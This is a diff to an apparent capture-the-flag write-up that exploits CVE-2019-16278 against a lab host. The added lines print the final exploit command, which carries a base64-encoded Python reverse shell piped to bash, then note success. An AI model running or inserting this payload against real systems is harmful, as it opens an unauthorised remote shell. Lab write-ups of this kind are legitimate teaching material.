@@ -52,10 +52,15 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 - Then urlencoded (all charaters)
 
 
-- Final payload
+- Final payload & command
 ```
 python2.7 cve2019_16278.py 10.10.10.165 80 "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjE1Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw%3D%3D|base64 -d|bash"
 ```
+
+![image](https://user-images.githubusercontent.com/5285547/124392273-7a77db80-dcec-11eb-991f-d8bb03df01b4.png)
+
+
+We're on the box
 
 
 
